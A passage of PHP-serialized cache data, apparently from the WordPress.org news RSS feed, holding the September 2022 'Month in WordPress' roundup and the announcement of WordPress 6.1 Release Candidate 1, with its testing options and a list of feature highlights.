10:07:36 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:18:\"Month in WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:18:\"month in wordpress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13596\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:179:\"September was an exciting month with the return of many in-person WordCamps, WordPress Translation Day, and preparations for WordPress 6.1. Let\'s catch up on all things WordPress.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:61:\"https://wordpress.org/news/files/2022/10/tt3_variations-1.mp4\";s:6:\"length\";s:6:\"996018\";s:4:\"type\";s:9:\"video/mp4\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"rmartinezduque\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:15456:\"\n<p>September was an exciting month with the return of many in-person WordCamps, WordPress Translation Day, and preparations for WordPress 6.1. Contributors across teams continue to work hard to ensure that the last major release of the year is the best it can be for everyone. Let&#8217;s catch up on all things WordPress.</p>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<h2>Countdown to WordPress 6.1: Coming November 1, 2022</h2>\n\n\n\n<p><strong>WordPress 6.1 is scheduled for release on November 1, 2022</strong>—less than three weeks away. Following the beta releases in September, the <a href=\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-1-rc1-now-available/\">first release candidate (RC1) is now ready for download and testing</a>.</p>\n\n\n\n<p>Members of the release squad hosted a casual walk-through of some of the expected WordPress 6.1 features last month. ​​<a href=\"https://make.wordpress.org/core/2022/09/14/6-1-product-walk-through-recap/\">The recording and transcript are available in this post</a>.</p>\n\n\n\n<p>This next major release focuses on increased control for a more intuitive site and content creation experience, and will be bundled with a new default block theme, <strong>Twenty Twenty-Three (TT3)</strong>. This theme comes with <a href=\"https://make.wordpress.org/design/2022/09/07/tt3-default-theme-announcing-style-variation-selections/\">10 style variations designed by community members</a> that you can easily switch between to customize the look and feel of your site.</p>\n\n\n\n<p>Other exciting updates include <a href=\"https://make.wordpress.org/core/2022/09/26/core-editor-improvement-catalyst-for-creativity/\">enhanced consistency of design tools across blocks</a>, a <a href=\"https://make.wordpress.org/core/2022/08/25/core-editor-improvement-refining-the-template-creation-experience/\">refined</a> and <a href=\"https://make.wordpress.org/core/2022/07/21/core-editor-improvement-deeper-customization-with-more-template-options/\">expanded template creation experience</a>, improved Quote and List blocks, and support for <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/#fluid-typography-support\">fluid typography</a>.</p>\n\n\n\n<figure class=\"wp-block-video\"><video controls src=\"https://wordpress.org/news/files/2022/10/tt3_variations-1.mp4\"></video><figcaption class=\"wp-element-caption\"><em>Selected style variations for the Twenty Twenty-Three theme.</em></figcaption></figure>\n\n\n\n<p><strong>Want to know what else is new in WordPress 6.1?</strong> Check out these resources for more details:</p>\n\n\n\n<ul>\n<li><a href=\"https://make.wordpress.org/core/2022/09/24/roadmap-to-6-1-core-companion/\">Roadmap to 6.1: Core Companion</a></li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/10/12/wordpress-6-1-field-guide/\">WordPress 6.1 Field Guide</a></li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/10/11/wordpress-6-1-accessibility-improvements/\">​​WordPress 6.1 Accessibility Improvements</a></li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/10/11/performance-field-guide-for-wordpress-6-1/\">Performance Field Guide for WordPress 6.1</a></li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Take part in this release by <a href=\"https://make.wordpress.org/test/2022/09/21/help-test-wordpress-6-1/\">helping to test key features</a> or <a href=\"https://make.wordpress.org/polyglots/2022/10/11/wordpress-6-1-ready-to-be-translated/\">translating WordPress 6.1</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Gutenberg versions 14.1, 14.2, and 14.3 are out</h2>\n\n\n\n<p>Three new versions of Gutenberg have been released since last month’s edition of The Month in WordPress:</p>\n\n\n\n<ul>\n<li><a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\"><strong>Gutenberg 14.1</strong></a> shipped on September 15, 2022. It adds typography and spacing support for many blocks, continuing efforts to consolidate design tools in blocks. It also includes improvements to the Navigation block and the content-locking experience. This is the last version of Gutenberg that will merge into WordPress 6.1, which will include updates from Gutenberg 13.1 to 14.1.</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/09/30/whats-new-in-gutenberg-14-2-28-september/\"><strong>Gutenberg 14.2</strong></a> comes with writing flow improvements, a more polished Calendar block, and autocompletion for links. It was released on September 28, 2022.</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/10/13/whats-new-in-gutenberg-14-3-12-october/\"><strong>Gutenberg 14.3</strong></a> is available for download as of October 12, 2022. This version makes it easier to navigate text blocks with <code>alt + arrow</code> keyboard combinations, and brings an improved drag-and-drop functionality for images, among other updates.</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Follow the “<a href=\"https://make.wordpress.org/core/tag/gutenberg-new/\">What’s new in Gutenberg</a>” posts to stay on top of the latest enhancements.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>WordPress Translation Day</h2>\n\n\n\n<p>On September 28, 2022, the Polyglots community celebrated <a href=\"https://wptranslationday.org/\"><strong>WordPress Translation Day</strong></a> (WPTD) with some global events throughout the week, including an <a href=\"https://wordpress.tv/2022/09/27/jesus-amieiro-alex-kirk-translate-wordpress-org-feedback-tool-walk-through/\">overview of the GlotPress feedback tool</a>. In addition, there were 13 local events in 11 different languages and across four continents.</p>\n\n\n\n<p>The Training Team joined the celebration by hosting a day-long event to help new contributors translate materials on learn.wordpress.org.</p>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p><a href=\"https://make.wordpress.org/polyglots/2022/10/04/2022-wordpress-translation-day-recap/\">Check out this recap</a> for more highlights from the event.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Team updates: Dropping security updates for WP 3.7 – 4.0, a new developer-focused course, and more</h2>\n\n\n\n<ul>\n<li>The WordPress Security Team will no longer provide <a href=\"https://wordpress.org/news/2022/09/dropping-security-updates-for-wordpress-versions-3-7-through-4-0/\">security updates for WordPress versions 3.7 through 4.0</a> as of December 2022.</li>\n\n\n\n<li>The first developer-focused course, <a href=\"https://learn.wordpress.org/course/using-the-wordpress-data-layer/\">Using the WordPress Data Layer</a>, is live on Learn WordPress.</li>\n\n\n\n<li>The <a href=\"https://make.wordpress.org/community/2022/09/29/meetup-reactivation-update/\">Global Meetup Reactivation project</a> gathered 39 supporters worldwide so far. As a result of their efforts, 117 meetup groups have reactivated or plan to reactivate in 2022!&nbsp;</li>\n\n\n\n<li>Learn more about <code>do_action</code>’s charity hackathons and how to host one in <a href=\"https://make.wordpress.org/community/2022/09/22/meetup-organizer-newsletter-september-2022/\">the latest edition of the Meetup Organizer Newsletter</a>.</li>\n\n\n\n<li>Would you like to help create content for the <a href=\"https://learn.wordpress.org/\">Learn WordPress</a> platform? The Training Team shared a post on <a href=\"https://make.wordpress.org/training/2022/09/30/become-an-online-workshop-facilitator-or-tutorial-presenter-today/\">how to become an online workshop facilitator or tutorial presenter</a>.</li>\n\n\n\n<li>The WebP proposal was pulled from the upcoming WordPress 6.1 release in response to <a href=\"https://make.wordpress.org/core/2022/09/11/webp-in-core-for-6-1/\">this post and subsequent discussions</a>. Users can still get this feature using the <a href=\"https://wordpress.org/plugins/performance-lab/\">Performance Lab plugin</a>.</li>\n\n\n\n<li>WordPress co-founder Matt Mullenweg suggested <a href=\"https://make.wordpress.org/core/2022/09/11/canonical-plugins-revisited/\">revisiting canonical plugins</a> and adopting a plugin-first approach when developing new features for core.</li>\n\n\n\n<li>The Plugin Team <a href=\"https://make.wordpress.org/plugins/2022/09/13/heroku-free-tier-being-retired/\">reminds plugin authors using Heroku&#8217;s free services to update their services</a> after the company announced the removal of their free plans.</li>\n\n\n\n<li>The Openverse Team <a href=\"https://make.wordpress.org/openverse/2022/09/13/community-meeting-recap-13-september-2022/\">removed the ‘beta’ status</a> from audio support. Also, the index <a href=\"https://make.wordpress.org/openverse/2022/09/05/openverse-biweekly-update-september-5th/\">now includes iNaturalist</a>, making it easy to discover CC-licensed images of flora, fauna, and nature contributed by this community of scientists and naturalists.</li>\n\n\n\n<li>The Hosting and Documentation Teams are collaborating on the creation of a new <a href=\"https://make.wordpress.org/hosting/2022/09/07/wordpress-advanced-administration-handbook/\">WordPress Advanced Administration Handbook</a>.</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Want to create diverse and inclusive events that make the WordPress community stronger, but not sure where to get started? <a href=\"https://make.wordpress.org/community/tag/wpdiversity/\">Join WPDiversity to learn more about upcoming workshops</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Feedback &amp; testing requests</h2>\n\n\n\n<ul>\n<li><a href=\"https://make.wordpress.org/community/2022/09/27/15-oct-survey-deadline/\"><strong>Last call to complete the Meetup Annual Survey</strong></a>! Help strengthen this global WordPress program by sharing your feedback by October 15, 2022.</li>\n\n\n\n<li>The Core Team is seeking <a href=\"https://make.wordpress.org/core/2022/10/10/seeking-proposals-for-interop-2023/\">proposals for Interop 2023</a>. Interop is an effort to improve interoperability across the three major web browser engines (Chromium, WebKit, and Gecko). You can submit yours until October 15, 2022.</li>\n\n\n\n<li>Don&#8217;t miss this call for testing on <a href=\"https://make.wordpress.org/themes/2022/09/12/testing-and-feedback-for-using-block-based-template-parts-in-classic-themes/\">using block-based template parts in classic themes</a>.</li>\n\n\n\n<li>The Community Team is gathering feedback on <a href=\"https://make.wordpress.org/community/2022/09/30/help-improve-the-make-community-contributor-day-onboarding/\">onboarding experiences at Contributor Days</a>.</li>\n\n\n\n<li>Version 20.9 of WordPress for <a href=\"https://make.wordpress.org/mobile/2022/10/04/call-for-testing-wordpress-for-android-20-9/\">Android</a> and <a href=\"https://make.wordpress.org/mobile/2022/10/04/call-for-testing-wordpress-for-ios-20-9/\">iOS</a> is available for testing.</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p><a href=\"https://wordpress.org/news/2022/10/episode-40-all-things-testing-with-special-guests-anne-mccarthy-and-brian-alexander/\">Tune in to the latest episode of WP Briefing</a> to hear guests Anne McCarthy and Brian Alexander discuss their work on the Testing Team and how you can get involved.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Event updates &amp; WordCamps</h2>\n\n\n\n<ul>\n<li>The last batch of <a href=\"https://asia.wordcamp.org/2023/\">WordCamp Asia 2023</a> tickets will be released on October 19, 2022. The organizing team is also <a href=\"https://asia.wordcamp.org/2023/call-for-contributors-stories/\">calling for contributors’ stories</a>.</li>\n\n\n\n<li><a href=\"https://us.wordcamp.org/2022/\">WordCamp US (WCUS) 2022</a> was successfully held last month in San Diego, California. Following two days of presentations, workshops, and a <a href=\"https://make.wordpress.org/project/2022/09/19/wcus-2022-qa/\">Q&amp;A session with Matt Mullenweg</a>, more than 300 attendees participated in the <a href=\"https://make.wordpress.org/updates/2022/09/18/wordcamp-us-contributor-day-2022-recap/\">Contributor Day</a>. National Harbor, Maryland, will host <a href=\"https://us.wordcamp.org/2022/announcing-wordcamp-us-2023/\">next year’s WordCamp US</a> and a Community Summit on August 23-25, 2023.</li>\n\n\n\n<li>In addition to WCUS, four in-person WordCamps took place in September in <a href=\"https://jinja.wordcamp.org/2022/\">Jinja (Uganda)</a>, <a href=\"https://kathmandu.wordcamp.org/2022/\">Kathmandu (Nepal)</a>, <a href=\"https://netherlands.wordcamp.org/2022/\">The Netherlands</a>, and <a href=\"https://pontevedra.wordcamp.org/2022/\">Pontevedra (Spain)</a>. And more WordPress events are on the schedule for the rest of October:\n<ul>\n<li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1ea-1f1f8.png\" alt=\"🇪🇸\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://valencia.wordcamp.org/2022/\">WordCamp Valencia</a>, Spain on October 21-22, 2022</li>\n\n\n\n<li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1e8-1f1ff.png\" alt=\"🇨🇿\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://brno.wordcamp.org/2022/\">WordCamp Brno</a>, Czech Republic on October 22, 2022</li>\n\n\n\n<li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1eb-1f1f7.png\" alt=\"🇫🇷\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://lyon.wordcamp.org/2022/\">WordCamp Lyon</a>, France on October 28, 2022</li>\n</ul>\n</li>\n</ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Curious about attending a WordCamp event? Listen to <a href=\"https://wordpress.org/news/2022/09/episode-39-contributor-stories-live-from-wordcamp-us/\">contributor stories from WordCamp US 2022</a> on why they use WordPress and go to WordCamps.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<p><strong><em><strong><em><strong><em>Have a story that we should include in the next issue of The Month in WordPress? <strong><em>Fill out </em></strong><a href=\"https://make.wordpress.org/community/month-in-wordpress-submissions/\"><strong><em>this quick form</em></strong></a><strong><em> to let us know.</em></strong></em></strong></em></strong></em></strong></p>\n\n\n\n<p><em><em>The following folks contributed to this edition of The Month in WordPress: </em><a href=\'https://profiles.wordpress.org/chaion07/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chaion07</a>, <a href=\'https://profiles.wordpress.org/laurlittle/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>laurlittle</a>, <a href=\'https://profiles.wordpress.org/rmartinezduque/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>rmartinezduque</a>, <a href=\'https://profiles.wordpress.org/robinwpdeveloper/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>robinwpdeveloper</a>, <a href=\'https://profiles.wordpress.org/santanainniss/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>santanainniss</a>, <a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>.</em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13596\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:5;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"WordPress 6.1 Release Candidate 1 (RC1) Now Available\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:87:\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-1-rc1-now-available/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 11 Oct 2022 20:53:18 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:11:\"Development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:11:\"development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13579\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:320:\"The first release candidate (RC1) for WordPress 6.1 is now available! This is an important milestone in the 6.1 release cycle. “Release Candidate” means that this version of WordPress is ready for release! Before the official release date, time is set aside for the community to perform final reviews and help test. \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:11:\"Dan Soschin\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:9468:\"\n<p>The first release candidate (RC1) for WordPress 6.1 is now available!</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>This is an important milestone in the 6.1 release cycle. “Release Candidate” means that this version of WordPress is ready for release! Before the official release date, time is set aside for the community to perform final reviews and help test. Since the WordPress ecosystem includes thousands of plugins and themes, it is important that everyone checks to see if anything was missed along the way. That means the project would <em>love</em> your help.</p>\n\n\n\n<p>WordPress 6.1 is planned for official release on November 1st, 2022, three weeks from today.&nbsp;</p>\n\n\n\n<p><strong>This version of the WordPress software is under development</strong>. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test RC1 on a test server and site.&nbsp;</p>\n\n\n\n<p>You can test WordPress 6.1 RC1 in three ways:</p>\n\n\n\n<p><strong>Option 1: </strong>Install and activate the <a href=\"https://wordpress.org/plugins/wordpress-beta-tester/\">WordPress Beta Tester</a> plugin (select the “Bleeding edge” channel and “Beta/RC Only” stream).</p>\n\n\n\n<p><strong>Option 2: </strong>Direct download the <a href=\"https://wordpress.org/wordpress-6.1-RC1.zip\">RC1 version (zip)</a>.</p>\n\n\n\n<p><strong>Option 3:</strong> Use the following WP-CLI command:</p>\n\n\n\n<p><code>wp core update --version=6.1-RC1</code></p>\n\n\n\n<p>Additional information on the <a href=\"https://make.wordpress.org/core/6-1/\">6.1 release cycle is available here</a>.</p>\n\n\n\n<p>Check the <a href=\"https://make.wordpress.org/core/\">Make WordPress Core blog</a> for <a href=\"https://make.wordpress.org/core/tag/dev-notes+6-1/\">6.1-related developer notes</a> in the coming weeks detailing all upcoming changes.</p>\n\n\n\n<h2>What’s in WordPress 6.1 RC1?</h2>\n\n\n\n<p>Since Beta 3, approximately 100 items have been addressed, bringing the total count to more than 2,000 updates since WordPress 6.0 in May of 2022.&nbsp;</p>\n\n\n\n<ul>\n<li><a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.1\">GitHub tickets</a></li>\n\n\n\n<li><a href=\"https://core.trac.wordpress.org/query?status=accepted&amp;status=closed&amp;changetime=10%2F04%2F2022..10%2F11%2F2022&amp;resolution=fixed&amp;milestone=6.1&amp;col=id&amp;col=summary&amp;col=status&amp;col=milestone&amp;col=owner&amp;col=type&amp;col=priority&amp;order=id\">Trac tickets</a>&nbsp;</li>\n</ul>\n\n\n\n<p>WordPress 6.1 is the third major release for 2022, following 5.9 and 6.0, released in January and May of this year, respectively.</p>\n\n\n\n<h3><strong>WordPress 6.1 highlights for end-users</strong></h3>\n\n\n\n<ul>\n<li>Default theme powered by 10 unique style variations (<a href=\"https://make.wordpress.org/design/2022/09/07/tt3-default-theme-announcing-style-variation-selections/\">learn more</a>)</li>\n\n\n\n<li>More design tools in more blocks (<a href=\"https://github.com/WordPress/gutenberg/issues/43241\">learn more</a>)</li>\n\n\n\n<li>Expanded and refined <a href=\"https://make.wordpress.org/core/2022/08/25/core-editor-improvement-refining-the-template-creation-experience/\">template experience</a> and <a href=\"https://make.wordpress.org/core/2022/07/21/core-editor-improvement-deeper-customization-with-more-template-options/\">template options</a></li>\n\n\n\n<li>More intuitive document settings experience</li>\n\n\n\n<li>Improved quote and list blocks with inner block support</li>\n\n\n\n<li>More robust placeholders for various blocks</li>\n\n\n\n<li>New modal interfaces and preferences improvements</li>\n\n\n\n<li>Automatic navigation block selection with fallbacks and easier menu management</li>\n\n\n\n<li>Apply locking settings to all inner blocks in one click</li>\n\n\n\n<li>Improvements to the block theme discovery experience</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/10/11/wordpress-6-1-accessibility-improvements/\">Accessibility updates</a>, with more than 60 resolved tickets</li>\n\n\n\n<li><a href=\"https://make.wordpress.org/core/2022/10/11/performance-field-guide-for-wordpress-6-1/\">Performance updates</a>, with more than 25 resolved tickets</li>\n</ul>\n\n\n\n<h3><strong>WordPress 6.1 highlights for developers</strong></h3>\n\n\n\n<ul>\n<li>Opt into appearance tools to make any theme more powerful</li>\n\n\n\n<li>New iteration on the style system</li>\n\n\n\n<li>Add starter patterns to any post type (<a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/#post-type-patterns\">learn more</a>)</li>\n\n\n\n<li>Evolution of layout options including a new constrained option and the ability to disable layout options</li>\n\n\n\n<li>Content lock patterns for more curation options</li>\n\n\n\n<li>Expanded support for query loop blocks</li>\n\n\n\n<li>Allow the use of block-based template parts in classic themes (<a href=\"https://make.wordpress.org/themes/2022/09/12/testing-and-feedback-for-using-block-based-template-parts-in-classic-themes/\">give feedback</a>)</li>\n\n\n\n<li>Filter <code>theme.json</code> data (<a href=\"https://developer.wordpress.org/block-editor/reference-guides/filters/global-styles-filters/\">learn more</a>)</li>\n\n\n\n<li>Fluid typography allows for more responsiveness (<a href=\"https://make.wordpress.org/themes/2022/08/15/testing-and-feedback-for-the-fluid-typography-feature/\">give feedback</a>)</li>\n\n\n\n<li>Ability to style elements inside blocks like buttons, headings, or captions in <code>theme.json</code></li>\n</ul>\n\n\n\n<p><em>Please note that all features listed in this post are subject to change before the final release</em>.</p>\n\n\n\n<h2>Plugin and theme developers</h2>\n\n\n\n<p>All plugin and theme developers should test their respective extensions against WordPress 6.1 RC1 and update the “<em>Tested up to”</em> version in their readme file to 6.1. If you find compatibility problems, please post detailed information to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">support forums</a>, so these items can be investigated further prior to the final release date of November 1st.</p>\n\n\n\n<h2>Translate WordPress</h2>\n\n\n\n<p>Do you speak a language other than English? <a href=\"https://translate.wordpress.org/projects/wp/dev\">Help translate WordPress into more than 100 languages.</a> This release also marks the <a href=\"https://make.wordpress.org/polyglots/handbook/glossary/#hard-freeze\">hard string freeze</a> point of the 6.1 release cycle.</p>\n\n\n\n<h2>Keep WordPress bug-free – help with testing</h2>\n\n\n\n<p>Testing for issues is critical for stabilizing a release throughout its development. Testing is also a great way to contribute. <a href=\"https://make.wordpress.org/test/2022/09/21/help-test-wordpress-6-1/\">This detailed guide</a> is an excellent start if you have never tested a beta release.</p>\n\n\n\n<p>Testing helps ensure that this and future releases of WordPress are as stable and issue-free as possible. Anyone can take part in testing – regardless of prior experience.</p>\n\n\n\n<p>Want to know more about testing releases like this one? Read about the <a href=\"https://make.wordpress.org/test/\">testing initiatives</a> that happen in Make Core. You can also join a <a href=\"https://wordpress.slack.com/messages/core-test/\">core-test channel</a> on the <a href=\"https://wordpress.slack.com/\">Making WordPress Slack workspace</a>.</p>\n\n\n\n<p>If you have run into an issue, please report it to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">Alpha/Beta area</a> in the support forums. If you are comfortable writing a reproducible bug report, you can <a href=\"https://core.trac.wordpress.org/newticket\">file one on WordPress Trac</a>. This is also where you can find a list of <a href=\"https://core.trac.wordpress.org/tickets/major\">known bugs</a>.</p>\n\n\n\n<p>To review features in the Gutenberg releases since WordPress 6.0 (the most recent major release of WordPress), access the <em>What’s New In Gutenberg</em> posts for <a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\">14.1</a>, <a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\">14.0</a>, <a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\">13.9</a>, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\">13.8</a>, <a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\">13.7</a>, <a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\">13.6</a>, <a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\">13.5</a>, <a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\">13.4</a>, <a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">13.3</a>, <a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">13.2</a>, and <a href=\"https://make.wordpress.org/core/2022/04/28/whats-new-in-gutenberg-13-1-27-april/\">13.1</a>.</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<h2>Haiku Fun for RC1</h2>\n\n\n\n<p>Languages abound<br>Test today, releases soon<br>Freedom to publish</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>Thank you to the following contributors for collaborating on this post:&nbsp;<a href=\"https://profiles.wordpress.org/webcommsat/\">@webcommsat</a></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13579\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:6;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			